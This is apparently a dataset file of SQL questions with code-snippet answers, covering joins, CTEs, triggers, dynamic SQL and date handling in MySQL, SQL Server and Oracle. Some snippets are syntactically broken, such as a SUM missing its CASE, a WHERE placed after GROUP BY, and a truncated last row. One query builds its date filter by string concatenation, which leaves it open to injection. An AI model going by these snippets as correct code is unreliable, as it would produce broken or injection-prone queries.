SELECT DATEADD(hh, DATEPART(hh, @Time), DATEADD(mi, DATEPART(mi, @Time), @Date)) --and so on
"
20603,55039,Find the latest location of each users in a MySQL table,"SELECT yt.* FROM your_table yt
INNER JOIN (
    SELECT
    email, MAX(timestamp) max_ts
    FROM
    your_table 
    GROUP BY email
) sq ON yt.email = sq.email AND yt.timestamp = sq.max_ts
"
7140,63765,How do you count all of the values in a column that satisfy your condition? (sqlite),"select count(ward) 
from
(SELECT ward FROM Table
 GROUP BY ward having SUM(working) > x) t
"
4615,33849,RODBC and sqlQueries with R objects,"Newvector<-sqlQuery(channel, paste(""SELECT"", Testquery, ""FROM"", Testtanle))
"
35493,42966,Query to find where associated model (has many) is empty in cakephp,"$this->Application->find('all',
    array(
        'conditions' => array('Location.id' => null),
        'joins' => array(
             array(
                'table' => 'locations',
                'alias' => 'Location',
                'type' => 'LEFT',
                'conditions' => array('Location.application_id = Application.id')
             ),
         ),
    )
);   
"
37960,68604,How to join two tables with redundant column value?," SELECT serviceIOD.keyword, 
 serviceIOD.shortcode 
 FROM serviceIOD where shortcode = 36788
 UNION select serviceSubs.keyword, 
 serviceSubs.shortcode  from serviceSubs where shortcode = 36788
"
39263,37159,How to write dynamic SQL Query to copy items from table with proper MasterLevelId,"CREATE PROCEDURE [dbo].[sp_CopyBudgetByBudgetId] 
@BudgetId int
AS
BEGIN
            DECLARE @identity int
            DECLARE @tempId int
            DECLARE @tempValue int

            INSERT INTO T_Budget ([BudgetName],[BudgetMaxLevel],[BudgetCurrency],[BudgetStatus],[BudgetAppliedToDonor],[sysDateTimeCreated],[sysDateTimeModified])
            SELECT [BudgetName],[BudgetMaxLevel],[BudgetCurrency],1,0,GETDATE(),GETDATE()
            FROM T_Budget
            WHERE ID = @BudgetId

            SELECT @identity= @@IDENTITY

            IF(@identity > 0)
            BEGIN
                    INSERT INTO T_BudgetCharts2([BudgetId],[BudgetItemLevel],[BudgetItemCode],[BudgetItemName],[BudgetItemMasterID],[BudgetItemBudegtValue],[BugedtItemStatus], [BugedtIdOriginal], [MasterIdOriginal],[sysDateTimeCreated],[sysDateTimeModified])
                    SELECT @identity,[BudgetItemLevel],[BudgetItemCode],[BudgetItemName],[BudgetItemMasterID],[BudgetItemBudegtValue],[BugedtItemStatus], [ID],[BudgetItemMasterID], GETDATE(),GETDATE()
                    FROM T_BudgetCharts2
                    WHERE BudgetId = @BudgetId

                    Declare @ID int
                    DECLARE IDs CURSOR LOCAL FOR (select ID from T_BudgetCharts2 where BudgetId = @identity)

                    OPEN IDs
                    FETCH NEXT FROM IDs into @ID

                    WHILE @@FETCH_STATUS = 0
                    BEGIN
                            If (Select MasterIdOriginal From T_BudgetCharts2 Where ID = @ID) IS NOT NULL
                                BEGIN
                                SET @tempId = (Select MasterIdOriginal From T_BudgetCharts2 Where ID = @ID)
                                SET @tempValue = (Select ID FROM T_BudgetCharts2 WHERE BugedtIdOriginal = @tempId) 
                                Update T_BudgetCharts2 SET BudgetItemMasterId = @tempValue WHERE ID = @ID
                            END
                            FETCH NEXT FROM IDs into @ID
                    END

                    CLOSE IDs
                    DEALLOCATE IDs
            END
END
"
8153,1341,"SQL help, selecting specific columns","DECLARE @myTable TABLE (myColumn nvarchar(100))
INSERT @myTable (myColumn) VALUES ('Crystal77'), ('Bólido Comidas'), ('PlainEnglish')

SELECT * FROM @myTable
     WHERE myColumn COLLATE Latin1_General_BIN NOT LIKE '%[^ a-zA-Z]%'
"
7840,55976,Mysql order by two colums independetly,"SELECT * 
FROM Table1 
ORDER BY 
  LEAST(
    IF(DiscountPrice=0, 1E18, DiscountPrice), 
    IF(ActualPrice=0, 1E18, ActualPrice)
  )
"
22510,35857,how get min group row only in mysql?,"SELECT t.name, t.mygroup, t.scale
    FROM test1 t
        INNER JOIN (SELECT mygroup, MIN(scale) AS MinScale
                        FROM test1
                        GROUP BY mygroup) q
            ON t.mygroup = q.mygroup
                AND t.scale = q.MinScale
"
28025,37482,Finding the difference in two MySQL tables that should be identical,"SELECT t1.* FROM table1 t1
LEFT JOIN table2 t2
  ON t1.id = t2.id
WHERE t2.id IS NULL
"
34069,62745,finding unique values with multiple columns using certain condition,"select A, B, C
from (select t.*,
             count(*) over (partition by A) as Acnt,
             min(B) over (partition by A) as Bmin,
             max(B) over (partition by A) as Bmax,
             min(C) over (partition by A) as Cmin,
             max(C) over (partition by A) as Cmax
      from t
     ) t
where (Bmin <> Bmax or Cmin <> Cmax)
"
6922,68932,mySQL : merge data from 3 tables in one result with one query statement,"select
     *
from invoice
     left join invoice_item on invoice_item.inv_id = invoice.ID
     left join clients on clients.ID = invoice.client_id
where
     invoice.inv_num = :num;  //Or the table where inv_number comes from

 corrected invoice.inv_number to invoice.inv_num
"
4050,17201,Dynamic crosstab in SQL Server 2000,"declare @a varchar(4000)
set @a = ''
select @a = @a + x
from
(select top 100 percent
',[' +groupid + ']=MAX(CASE groupid WHEN ''' +groupid+ '''  THEN ''X'' ELSE ''--'' END)' x
from #DistinctPages Group by groupid order by groupid) t

exec ('SELECT pageno' + @a + ' FROM #DistinctPages GROUP BY pageno ORDER BY pageno')
"
16385,18279,Hiding password for SQL user in Powershell,"$Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)
$clearpassword = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
"
26466,60243,Showing data from another table if it exists,"SELECT e.id, l.ext_id 
FROM events_template e
LEFT JOIN laser_events  l ON e.id = l.ext_id;
"
7806,61519,"ORACLE SQL: JOINS, AGGREGATES, SUBQUERIES","select department_number, employee_number, employee_name, salary, 
(select AVG(salary) from employee B where A.department_number = B.department_number)
from employees A
"
5821,25638,Using a string of quoted values in a variable for a SQL WHERE CLAUSE,"DECLARE @ListOfValues TABLE (ItemName VARCHAR(50))

INSERT INTO @ListOfValues(ItemName) 
VALUES('aaa'), ('bbb'), ('ccc')

SELECT *    
FROM TABLEA 
WHERE FIELD1 IN (SELECT ItemName FROM @ListOfValues)
"
15651,18010,Find the unique value in column MS SQL database,"SELECT number, quantity
FROM   my_table
WHERE  number IN (SELECT   number
                  FROM     my_table
                  GROUP BY number
                  HAVING   COUNT(*) = 1)
"
39427,5171,Including Null values in SQL query,"SELECT round(avg(round((datediff(now(),dateofbirth)/365),0))) as 'Average Age', 
       propertyname 
from apartment
LEFT JOIN buyer ON buyer.propertyID = apartment.propID 
group by propertyname
UNION ALL
SELECT round(avg(round((datediff(now(),dateofbirth)/365),0))) as 'Average Age', 
       propertyname 
from house
LEFT JOIN buyer ON buyer.propertyID = house.propID
group by propertyname
"
27712,34077,Concat specific string to every inserted row,"-- create the trigger, give it a meaningful name
CREATE TRIGGER PrependHttpPrefix
ON dbo.YourTableName            -- it's on a specific table
AFTER INSERT, UPDATE            -- it's for a specific operation, or several
AS
BEGIN
    -- the newly inserted rows are stored in the ""Inserted"" pseudo table.
    -- It has the exact same structure as your table that this trigger is 
    -- attached to.
    -- SQL Server works in such a way that if the INSERT affected multiple
    -- rows, the trigger is called *once* and ""Inserted"" contains those
    -- multiple rows - you need to work with ""Inserted"" as a multi-row data set
    --
    -- You need to join the ""Inserted"" rows to your table (based on the 
    -- primary key for the table); for those rows newly inserted that 
    -- **do not** start with ""http://"" in ""YourColumn"", you need to set 
    -- that column value to the fixed text ""http:/"" plus whatever has been inserted
    UPDATE tbl
    SET YourColumn = 'http://' + i.YourColumn
    FROM dbo.YourTableName tbl
    INNER JOIN Inserted i ON tbl.PKColumn = i.PKColumn
    WHERE LEFT(i.YourColumn, 7) <> 'http://'
END
"
36622,46746,Extracting related records from 2 columns in the same table using sql server,";WITH cte AS
(SELECT convert(nvarchar(max),';'+name+';') namelist, t.Name, t.friends 
 FROM @t t WHERE name = 'Joe'
 UNION ALL
 SELECT convert(nvarchar(max),c.namelist+c.Friends+';'), 
        c.Friends, 
        case c.friends when t.name then t.friends else t.name end
 FROM cte c
 JOIN @t t 
   ON c.friends IN (t.name, t.friends) AND
      charindex(';'+case c.friends when t.name then t.friends else t.name end+';', 
                c.namelist)=0
)
SELECT name FROM cte UNION SELECT friends FROM cte
OPTION (maxrecursion 0)
"
29814,63802,UPDATE record with subquery into own table,"UPDATE calendar 
SET daterank = (
    SELECT MAX(c2.daterank)
    FROM calendar c2
    WHERE c2.thedate < calendar.thedate
    AND c2.daterank IS NOT NULL
)
WHERE daterank IS NULL
"
22498,48811,"Join Table, Do not show values when there is matches between two tables","WHERE inf.IssueState IS NULL
"
28377,67385,how to use the subquery with in the case statement in mssql 2008,"SELECT @emf = CASE 
            WHEN ( (SELECT Count(*) 
                    FROM   pseb.dbo.meterattributedetails 
                    WHERE  meterid = @meterid) = 0 ) THEN 
            (SELECT emf 
             FROM   pseb.dbo.metermaster 
             WHERE  meterid = @meterid) 
            WHEN ( (SELECT Count(*) 
                    FROM   pseb.dbo.meterattributedetails 
                    WHERE  meterid = @meterid 
                           AND Dateadd(day, 1, @fromdate) < datetime) > 0 ) 
          THEN ( 
            SELECT 
            TOP 1 oldvalue 
            FROM 
          pseb.dbo.meterattributedetails 
            WHERE 
          meterid = @meterid 
          AND Dateadd(day, 1, @fromdate) < datetime 
            ORDER 
          BY datetime) 
            ELSE (SELECT TOP 1 newvalue 
                  FROM   pseb.dbo.meterattributedetails 
                  WHERE  meterid = @meterid 
                         AND datetime < @fromdate 
                  ORDER  BY datetime DESC) 
          END 
"
16765,37083,Where is the oracle db stored in windows,"select * from dba_data_files; -- The database files (this is where the tables live)
select * from v$logfile; -- The online redo logs
select * from v$controlfiles; -- The controlfiles
"
7057,2664,MYSQL join 3rd table,"   SELECT T2.name as username, T2.id as userid, 
           T2.lastactivity as lastactivity, T2.photo as avatar,T3.*
    FROM exchange AS T2
      INNER JOIN 
        ( SELECT (CASE WHEN `buddy`.`penpalA` = 887 
                         THEN `buddy`.`penpalB` 
                         ELSE `buddy`.`penpalA` 
                  END) AS 'friend'
          FROM `buddy`
          WHERE status = 1 AND `penpalA` = 887
             OR `penpalB` = 887
        ) AS _Temp 
        ON _Temp.friend = T2.`id`
     LEFT JOIN details T3 ON _Temp.friend=T3.UserId
"
22763,60450,Windows-1252 (80-9F) control characters are inserted as � in oracle db when it is inserted from sqlplus in linux server,"NLS_LANG=American_America.UTF8
NLS_LANG=AMERICAN_AMERICA.AL32UTF8
"
29990,64582,SQL Join query assistance,"SELECT dateadd(month, datediff(month,0, cna.impdate),0) as [Month], 
       count(*) as itemcount, 
       SUM(CASE WHEN emergency = 'Emergency' THEN 1 ELSE 0 END) AS EmergencyCount
FROM myTable
WHERE impdate BETWEEN '"" + fromDate + ""' AND '"" + toDate + ""'
GROUP BY dateadd(month, datediff(month,0, cna.impdate),0)
ORDER BY [Month] asc
"
13064,2855,Time difference among end dates of first records to next record first dates,"SELECT  SourceId,RecordId,StartDate,EndDate
   , DATEDIFF(mi,a.EndDate,b.StartDate) DiffMin
FROM table a
LEFT JOIN table b ON A.no = B.no+1
"
8036,73739,Calculating a field from SQL Query Selecting from multiple tables with Union,"SELECT MTGUID * 1.35 as calculatedMTGUID, SUBSEL.* FROM (  
SELECT BKRETAIL.* FROM BKRETAIL WHERE BKRETAIL.MKEY='SOMEKEY' 
UNION  SELECT BKWHOLESALE.* FROM BKWHOLESALE WHERE MKEY='SOMEKEY') SUBSEL
ORDER BY  
case STATUS     
WHEN 'RT' then 1     
WHEN 'WH' then 2     
WHEN 'OL' then 3     
WHEN 'OD' then 4     
WHEN NULL then 5     
else 6  
end; 
"
32645,31824,Display column names with out datatype in MYSQL,"SELECT column_name
FROM information_schema.columns
WHERE table_schema = 'db_name'
AND table_name = 'your_table'
"
24423,11443,Determine installed sql server instances?,"Select @@version
"
34236,4579,SQL: Select the latest datetime value when duplicates found on another column,"update a
set a.isFinalReport = false
from service_reports a
where isnull(a.isFinalReport, 1) = 1
and exists
(select 1
from service_reports b
where b.fk_service = a.fk_service
and b.done_date > a.done_date)
"
16869,47086,What version of JET does Windows Server 2003 ENT SP2 use?,"Msjet40.dll Jet 4.0 release level
version 
4.0.2927.4  Service Pack 3 (SP3)
4.0.3714.7  Service Pack 4 (SP4)
4.0.4431.1 or 
4.0.4431.3  Service Pack 5 (SP5)
4.0.6218.0  Service Pack 6 (SP6)
4.0.6807.0  Service Pack 6 (SP6) shipped only with Windows Server 2003
4.0.7328.0  Service Pack 7 (SP7)
4.0.8015.0  Service Pack 8 (SP8)
4.0.8618.0  Windows XP SP2 and Security Bulletin MS04-014
4.0.9025.0  Windows Server 2003 SP1 and Update Rollup 1 for Windows 2000 SP4
4.0.9505.0  Windows Server 2003 SP2
4.0.9511.0  Windows XP SP3 and Security Bulletin MS08-028
4.0.9635.0  Windows Vista
4.0.9704.0  Windows Vista   SP1 and Windows Server 2008
"
7584,26414,Get the highest value of the last 7 days with SQL,"SELECT MAX(value) as value_of_week
FROM events
WHERE event_date > date_add(now(), interval -7 day);
"
1194,38529,How to order by a part of a column,"SUBSTRING_INDEX(my_field, ',', -1)
"
34970,40017,mysql joining table,"SELECT  iStudentList.`ID`,
    iStudentList.`Name`,
    iStudentList.`Age`,
    ClassList.`iOrder`
FROM
ClassList INNER JOIN 
    (SELECT `ID`, `Name`, `Age`, ""A"" as iOrder FROM BoyssList
        UNION
     SELECT `ID`, `Name`, `Age`, ""B"" as iOrder FROM GirlsList) as iStudentList
ON ClassList.`ID` = iStudentList.`ID`
ORDER BY ClassList.`iOrder` DESC, iStudentList.`Name` ASC
"
3348,39226,SQL WHEREing on a different table's COUNT,"SELECT  
   new_tags.tag_id, new_tags.tag_name,  
   new_tags.tag_description,  
   COUNT(DISTINCT new_tags_entries.entry_id) AS entry_count  
FROM (new_tags)  
JOIN new_tags_entries ON new_tags_entries.tag_id = new_tags.tag_id   
WHERE `new_tags`.`tag_name` LIKE '%w'   
GROUP BY new_tags.tag_id  
HAVING COUNT(DISTINCT new_tags_entries.entry_id)  < '1' 
ORDER BY tag_name ASC
"
28610,1854,SQL Combine two tables in select statement,"SELECT StuffYouWant
FROM (SELECT *
      FROM TableA
      UNION  ALL
      SELECT *
      FROM TableB) c
"
33252,61745,MySQL Query 3 tables linked by 2 linking tables,"SELECT p.`name`, GROUP_CONCAT(s.name) from physician p
  /* Join physician and office */
  INNER JOIN j_md_ofc p2o
    ON (p.id = p2o.physician_id)
  /* Join speciality and physician */
  INNER JOIN j_md_spc p2s
    ON (p.id = p2s.physician_id)
  /* Join speciality_id with speciality name */
  INNER JOIN speciality s
    ON (s.id = p2s.speciality_id)
  /* Join office_id with office name */
  INNER JOIN office o
    ON (o.id = p2o.office_id)
WHERE o.name = ""a""
GROUP BY p.name
"
22833,39740,Referencing calculated value in SQL,"SELECT result 
FROM t
,LATERAL (SELECT c+10) AS s(result)  -- here you calculate what you need
WHERE result > 10;
"
21353,3692,SQL Query WHERE is not,"SELECT *
FROM   mytable
WHERE  country <> 'United Kingdom'
"
29576,20679,SQL SORTING ISSUE WITH GROUP BY,"SELECT TOP 10 tb_show.showId, tb_Show.Title, tb_Show.PageName, MAX(quantity) as Quantity
FROM tb_OrderItem 
    INNER JOIN tb_Show 
        ON tb_OrderItem.ShowId = tb_Show.showId 
WHERE tb_show.IsDeleted = 0 AND tb_show.PrivateShow = 0 AND tb_show.Archive = 0 
GROUP BY tb_show.showId, tb_Show.Title, tb_Show.PageName
ORDER BY MAX(quantity)
"
35175,27657,Oracle Partition by 2 columns Interval,"create table TABLE_TEST
(
  PROCESS_DATE DATE GENERATED ALWAYS AS (TO_DATE(SUBSTR(CHARGE_DATE_TIME,1,10),'YYYYMMDD')),
  PROCESS_HOUR VARCHAR2(8) GENERATED ALWAYS AS (SUBSTR(CHARGE_DATE_TIME,12,2)),
  PROCESS_DATE_HOUR DATE GENERATED ALWAYS AS (TO_DATE(CHARGE_DATE_TIME, 'YYYYMMDDHH24')),
  ANUM VARCHAR2(100),
  SWTICH_DATE_TIME VARCHAR2(100), 
  CHARGE_DATE_TIME VARCHAR2(100),
  CHARGE VARCHAR2(100)
)
PARTITION BY RANGE (PROCESS_DATE_HOUR)
INTERVAL (NUMTODSINTERVAL(1,'DAY'))
(
  PARTITION TEST_PART_0 VALUES LESS THAN (DATE '1970-01-01')
);

Table table_test created.
"
18451,16215,Database query from multiple tables,"Select ci.Name, cl.CLAIMNUM
From CUSINFO ci
inner join CLAIMS cl on ci.NAMEID = cl.NAMEID 
"
24950,36962,The Instructor have 2 teaching subject,"CREATE TABLE Instructor
(
    ID INT,
    InstructorName VARCHAR(30),
    ..... -- other fields here
);

CREATE TABLE Subject
(
    ID INT,
    SubjectNameName VARCHAR(30),
    ..... -- other fields here
);

CREATE TABLE INSTRUCTOR_SUBJECT
(
    RecID INT,
    InstructorID INT,
    SubjectID INT,
    CONSTRAINT tc_pk PRIMARY KEY (RecID),
    CONSTRAINT tc_fk1 FOREIGN KEY (InstructorID) REFERENCES Instructor(ID),
    CONSTRAINT tc_fk2 FOREIGN KEY (SubjectID) REFERENCES Subject(ID)
);
"
6255,50980,UPDATE...FROM in MySQL,"SET @RunningTotal := 0;

UPDATE LedgerTbl 
   SET RTotal = (@RunningTotal := @RunningTotal + (DEBIT - CREDIT));
"
28842,49563,Order By on the Basis of Dictint Group count,"using (var context = new MyDbContext())
{
    var documentEntities = (from document in context.Documents
        join document_word in context.Document_Word on document equals document_word.Document
        join word in context.Words on document_word.Word equals word
        where word.Word1 == ""this"" // Filter for word = ""this""
        group document_word by document_word.Document.Id into documentWordGroup // First group Document_Words by document Id so that we can sort based on the Id count
        let IdCount = documentWordGroup.Count() // store the count into a variable IdCount
        orderby IdCount descending // here we sort by the IdCount
        select documentWordGroup).ToArray() // select the sorted Document_Word groups
        .SelectMany(dw => dw); // combine the groups into a single array of Document_Words

    //Display the result in the Console output
    Console.WriteLine(""ID"" + ""\t"" + ""Location"");
    foreach (var document in documentEntities)
    {
        Console.WriteLine(document.Document.Id + ""\t"" + document.Location);
    }
}
"
38381,32387,SQL - Drop exactly duplicate rows of records based on 2 columns as validation,"DELETE
FROM Clients_Visits v1
WHERE EXISTS (SELECT RecID 
              FROM Clients_Visits v2 
              WHERE v1.Customer_No=v2.Customer_No
                  AND v1.DateOfVisit=v2.DateOfVisit
                  AND v1.VisitType=v2.VisitType
                  AND v1.RecID>v2.RecID)
"
31559,33088,A double outer join,"SELECT 
    P.name as ""people.name"", 
    IFNULL(pm.id_people,''), 
    IFNULL(pm.id_action,''), 
    A.name as ""action.name""
FROM Action A
CROSS JOIN People P
LEFT JOIN permission pm 
    ON pm.id_action = a.id
    AND pm.id_people = p.id
WHERE p.name = 'John'
"
36366,52539,Modifying the query for view,"select max(cast(mybool as INT)) from MyView
"
17258,75153,How to get a set of unique parents given a list of children in SQL,"; with  Cte as
        (
        select  ID
        ,       ParentID
        from    Table1
        where   ID in (1, 2, 3, 4, 5)
        union all
        select  parent.ID
        ,       parent.ParentID
        from    Table1 parent
        join    Cte child
        on      child.ParentID = parent.ID
        )
select  distinct ID
from    Cte
where   ParentID is null
"
13037,8907,How to sum the actual value with the above row value only for a specific key on a mySQL Select,"select
    PreAgg.SE_NOME,
    PreAgg.PNT,
    CASE 
        WHEN @PrevNome<>PreAgg.SE_NOME THEN @PrevBal := PreAgg.PNT 
        ELSE @PrevBal := @PrevBal + PreAgg.PNT 
    END as Total,
    @PrevNome := PreAgg.SE_NOME as Nome
from 
  ( select
          eg.SE_NOME,
          eg.PNT
       from
          energia as eg
       order by
          eg.SE_NOME ) as PreAgg,
  ( select @PrevBal := 0.00 ) as SqlVars1,
  ( select @PrevNome := '' ) as SqlVars2
"
6466,13021,Get the results of sp_helptext as a single string,"DECLARE @Table TABLE(
    	Val VARCHAR(MAX)
)

INSERT INTO @Table EXEC sp_helptext 'sp_configure'

DECLARE @Val VARCHAR(MAX)

SELECT  @Val = COALESCE(@Val + ' ' + Val, Val)
FROM    @Table

SELECT @Val
"
31147,34628,How can optimize a query without repeat the value of the condition?,"select distinct @sql := concat('SELECT pb.name as unit,',group_concat(concat(
 'SUM(CASE WHEN p.state =0 AND ce.id=',id,' THEN 1 ELSE 0 END ) AS v',id,', 
  SUM(CASE WHEN p.state =1 AND ce.id=',id,' THEN 1 ELSE 0 END ) AS a',id,', 
  SUM(CASE WHEN p.state =2 AND ce.id=',id,' THEN 1 ELSE 0 END ) AS n',id)),
' FROM cia_ensures ce 
  LEFT JOIN policies p on ce.id = p.cia_ensure_id
  INNER JOIN policy_business_units pb ON pb.id = p.policy_business_unit_id
  INNER JOIN comercial_areas ca ON ca.id = pb.comercial_area_id
  AND ca.id=1  
  Group by p.policy_business_unit_id;')
from cia_ensures
where id in(1,3,5);

prepare stmt from @sql;
execute stmt;
"
34938,10377,Same LIKE condition applied to many columns,"WHERE t1.FullName LIKE '%sometext%' OR t1.Comment LIKE '%sometext%' OR
      t2.Name LIKE '%sometext%' OR t3.Description  LIKE '%sometext%'
"
16744,65201,one to many sql query with good performance,"Select PAYMENT_SCHEDULE_MASTER_ID from (
Select COUNT(*)  As IdCount, PAYMENT_SCHEDULE_MASTER_ID, ACTUAL , FORECAST
from PAYMENT_SCHEDULE_DETAIL
group by PAYMENT_SCHEDULE_MASTER_ID, ACTUAL, FORECAST) t
where t.IdCount = 1 
and t.ACTUAL = 0.00
and t.FORECAST = 0.00
"
29827,73309,"SQL Has Many association search (key, value)","select ad_id
from values v
where key = 'brand' and value = 'BMW' or
      key = 'model' and value = 'serie 1'
group by ad_id
having count(*) = 2;
"
22859,64417,Could use advice in making my query smarter,"WITH CTE AS
(SELECT d.item d_item, e.item e_item, e.pack_no e_pack_no, g.store loc
 FROM dc_store_ranging a
 JOIN store g
   ON g.store_name_secondary = CAST(a.loc AS VARCHAR2(150 BYTE)) AND
      g.store_close_date >= SYSDATE
 LEFT JOIN dc_pim_export_vert b
        ON a.dpac = b.dpac AND b.artikel_type_LMS NOT IN ('S','V')
 LEFT JOIN dc_ccn190_sid_vtb c ON a.dpac = c.dpac
 JOIN item_master d
   ON (b.item = d.item OR c.item = d.item) AND d.status = 'A'
 LEFT JOIN packitem e
        ON (b.item = e.pack_no or c.item = e.pack_no)
)
SELECT DISTINCT item, loc FROM
(--SELECT e_pack_no item, loc FROM CTE WHERE d_item = e_pack_no UNION ALL -- this select is a subset of the third select
 SELECT e_item item, loc FROM CTE UNION ALL
 SELECT d_item item, loc FROM CTE) uc
WHERE uc.item NOT IN
      (SELECT f.item
       FROM item_attributes f
       WHERE f.sh_store_order_unit = 'N' and f.sh_trade_unit = 'Y')
"
38677,44469,A single sql query which can handle both null or valued date range in sql server,"WITH    limits AS
        (
        SELECT  COALESCE(@startDate, MIN(mydate)) AS startDate, COALESCE(@endDate, MAX(mydate)) AS endDate
        FROM    mytable
        )
SELECT  m.*
FROM    limits
JOIN    mytable m
ON      mydate BETWEEN startDate AND endDate
"
19697,65995,Access 2010 Database - Count number of instances,"Select POTYPE, Count(POTYPE) From TableA Group By POTYPE
"
25442,8679,Oracle SQL clause evaluation order,"SELECT foo+bar foobar FROM table1 ORDER BY foobar
"
3917,43401,Update an oracle table from another table in SAS,"proc sql;
  create view sas.additional_rows as
   select * from sas.new_table S
     where not exists (
       select 1 from abc.old_table O
         where O.colA=S.colA
           and O.colB=S.colB
     );

  create view sas.to_update as
   select * from sas.new_table S
     where exists (
       select 1 from abc.old_table O
         where O.colA=S.colA
           and O.colB=S.colB
           and O.colC ne S.colC
     );
quit;
"
38178,14943,MySQL: I need more than two OR conditions! How can I do that?,"$sql - ""SELECT title, description, picture
        FROM clothes 
        WHERE type LIKE :keyword OR
              color LIKE :keyword OR
              brand LIKE :keyword OR
              material LIKE :keyword"";
"
37414,12963,Filter on count(*) in oracle,"select ID, count(*) cnt
from name
group by ID
having count(*) > 1;
"
15046,20666,SQL Query for Logins,"select * from master..syslogins
"
22132,16344,SQL iterate for each group,"SELECT t1.ID, t1.GroupID, t1.Status, t1.Date
FROM MyTable t1
WHERE t1.Date IN (
    SELECT MAX(t2.Date)
    FROM MyTable t2
    WHERE t2.GroupID = t1.GroupID
    AND t2.Date <= '7/31/2011'
    UNION
    SELECT MIN(t3.Date)
    FROM MyTable t3
    WHERE t3.GroupID = t1.GroupID
    AND t3.Date >= '7/31/2011'
)
"
9580,23730,how to get similar objects based on tags,"SELECT movie.*, count(DISTINCT similar.tag) as shared_tags FROM movie INNER JOIN 
    ( tagged AS this_movie INNER JOIN tagged AS similar USING (tag) )
    ON similar.movie = movie.id
WHERE this_movie.movie=<current_movie_id>
AND   movie.id != this_movie.movie
GROUP BY movie.id
ORDER BY shared_tags DESC
"
12238,4308,MYSQL List of number between a range,"SELECT DISTINCT TableA.ID
FROM
  TableA INNER JOIN Ranges
  ON TableA.ID BETWEEN Ranges.id_lower AND Ranges.id_upper
"
14378,334,Using WITH + DELETE clause in a single query in postgresql,"WITH max_table as (
    SELECT uid, max(timestamp) - 10000 as mx
    FROM listens 
    GROUP BY uid
) 
DELETE FROM listens 
WHERE timestamp < (SELECT mx
                   FROM max_table 
                   where max_table.uid = listens.uid);
"
15995,40838,How to rebuild index in a specific table columns?,"ALTER INDEX [index_name] ON [dbo].[MyTable] REBUILD WITH (FILLFACTOR = 80, STATISTICS_NORECOMPUTE = ON);
"
31309,52840,How to divide by the result of another query,"select JOB_GROUP, CURRENT_PEOPLE,
       CURRENT_PEOPLE / sum(job_group = 'WORKER1' then CURRENT_PEOPLE end) over () as Ratio
from (SELECT JOB_GROUP,
             SUM(PEOPLE) AS CURRENT_PEOPLE
      FROM my_view
      WHERE MONTH = '01-DEC-2013'
      GROUP BY ROLLUP (JOB_GROUP)
     ) t
ORDER BY RATIO DESC;
"
25019,34392,SQL -Database Access,"SELECT BANINST1_SZVIRST.SZVIRST_TERM_DESC,
    Count( iif(BANINST1_SZVIRST.SZVIRST_FULL_PART_IND = ""F"", 1 ,NULL)) AS [""Full-time Undergraduate Enrollment""],
    Count( iif(BANINST1_SZVIRST.SZVIRST_FULL_PART_IND = ""P"", 1,NULL)) AS [""Part-time Undergraduate Enrollment""],
    Count(BANINST1_SZVIRST.SZVIRST_PIDM) AS [""TOTAL Undergraduate Enrollment""],
    Count(BANINST1_SZVIRST.SZVIRST_PIDM) AS [""TOTAL Graduate Enrollment""],
    Count(BANINST1_SZVIRST.SZVIRST_PIDM) AS [""TOTAL  Enrollment""]
FROM BANINST1_SZVIRST
GROUP BY BANINST1_SZVIRST.SZVIRST_TERM_DESC,
    BANINST1_SZVIRST.SZVIRST_TERM_CODE,
    BANINST1_SZVIRST.SZVIRST_LEVL_CODE,
    BANINST1_SZVIRST.SZVIRST_FULL_PART_IND
WHERE (
        (
            (BANINST1_SZVIRST.SZVIRST_TERM_CODE) IN (
                ""201020"",
                ""201120"",
                ""201220"",
                ""201320"",
                ""201420"",
                ""201520"",
                ""201620""
                )
            )
        AND ((BANINST1_SZVIRST.SZVIRST_LEVL_CODE) = ""01"")

        );
"
22497,69293,Subquery return more than 1 row MySQL,"DELETE d
FROM departments d
INNER JOIN employees e ON d.department_id = e.department_id
WHERE e.salary > 100000;
"
15820,57572,SQL query to return all items who have a particular id,"SELECT ITEMID, 
       ITEMDESC, 
       Isnull(GROUPDESC, '') GroupDesc 
FROM   ITEMTABLE T1 
       LEFT JOIN GROUPTABLE T2 
              ON T1.GROUPID = T2.GROUPID 
WHERE  ITEMID = @Chosen 
"
15234,9218,SQL query for fetching data from multiple tables,"SELECT y, z
FROM   one
JOIN   two ON one.x = two.x
"
35612,19780,MySQL Left Outer Join not returning NULL values for COUNT(*),"select TABLE1.USERNAME, count(TABLE2.FORMS)
from TABLE1 left outer join
     TABLE2
     on (TABLE2.USERID = TABLE1.USERID) and TABLE2.STATUS = COMPLETED and
        TABLE2.DATE > 20140801
group by TABLE1.USERNAME;
"
31354,60751,Convert a date into 'YYYYMMDDHH24miSS' format,"SQL> select to_char(to_date('2012/11/24 13:32','yyyy/mm/dd hh24:mi'),'YYYYMMDDHH24miSS') res from dual;

RES
--------------
20121124133200
"
20569,61147,Save image path in database issue,"1 | user9876/imagename_og.jpg | 1
2 | user9876/imagename_me.jpg | 2
3 | user9876/imagename_sm.jpg | 3
"
9898,15374,Copy table from one database to another,"select  *
into    DbName.dbo.NewTable
from    LinkedServer.DbName.dbo.OldTable
"
896,65628,"Inner Join with LIKE, what is wrong?","SELECT *
FROM   prd_help_zusatz h
JOIN   prd_produkt p 
  ON   p.PRD_material LIKE CONCAT('%', h.ID, '%') AND
       p.PRDART = 'uhr'
"
4994,8457,Incrementing an Integer in SQL Server,"UPDATE TheTable SET RevisionId = RevisionId + 1 WHERE Id=@id
"
8515,6482,SELECT and DELETE,"DELETE te
FROM telefono as te
    LEFT JOIN centro_telefono ce
        ON te.telefono_id=ce.telefono_id AND ce.telefono_id IS NOT NULL
    LEFT JOIN contacto_telefono co
        ON te.telefono_id=co.telefono_id AND co.telefono_id IS NOT NULL
WHERE
    COALESCE(ce.telefono_id, co.telefono_id) IS NULL
    AND te.fecha_alta < DATE_SUB(NOW(), INTERVAL 1 DAY)
"
15963,35332,How do I 'subtract' sql tables?,"  SELECT ... // all documents
  EXCEPT
  SELECT ... // active documents
"
30446,5291,Special ORDER BY with CASE statement - In need of guidance,"select id, price
from (select t.*,
             min(price) over (partition by id) as minprice
      from t
     ) t
order by minprice, id, price
"
35160,63189,SQL Aggregate While performing CASE on different field,"SELECT 
      [SampleID]
      ,SUM([Result]) AS [SumResult]
      CASE MAX(CASE Qualifier
      WHEN '*' THEN 1   WHEN 'ND' THEN 2   WHEN '>' THEN 3 END)
      WHEN 1 THEN '*'   WHEN 2 THEN 'ND'   WHEN 3 THEN '>' END as Qualifier
